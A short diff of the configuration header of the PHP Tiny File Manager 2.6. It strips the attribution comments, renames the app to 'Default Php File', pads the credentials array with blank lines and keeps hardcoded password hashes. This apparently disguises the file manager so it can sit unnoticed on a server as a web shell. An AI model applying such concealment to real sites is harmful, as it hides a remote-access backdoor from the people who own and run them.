@@ -1,31 +1,24 @@
 <?php
-//Default Configuration
 $CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":false,"theme":"light"}';
-
-/**
- * H3K ~ Tiny File Manager V2.6
- * @author CCP Programmers
- * @github https://github.com/prasathmani/tinyfilemanager
- * @link https://tinyfilemanager.github.io
- */
-
-//TFM version
 define('VERSION', '2.6');
-
-//Application Title
-define('APP_TITLE', 'Tiny File Manager');
-
-// --- EDIT BELOW CONFIGURATION CAREFULLY ---
-
-// Auth with login/password
-// set true/false to enable/disable it
-// Is independent from IP white- and blacklisting
+define('APP_TITLE', 'Default Php File');
 $use_auth = true;
-
-// Login user name and password
-// Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
-// Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
 $auth_users = array(
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
     'admin' => '$2a$12$BVI.VqZnWAf0269497spiOOkIEW6hO8pgCy3E9VuH53dBhc.spMpy',
     'user' => '$2a$12$BVI.VqZnWAf0269497spiOOkIEW6hO8pgCy3E9VuH53dBhc.spMpy' 
 );
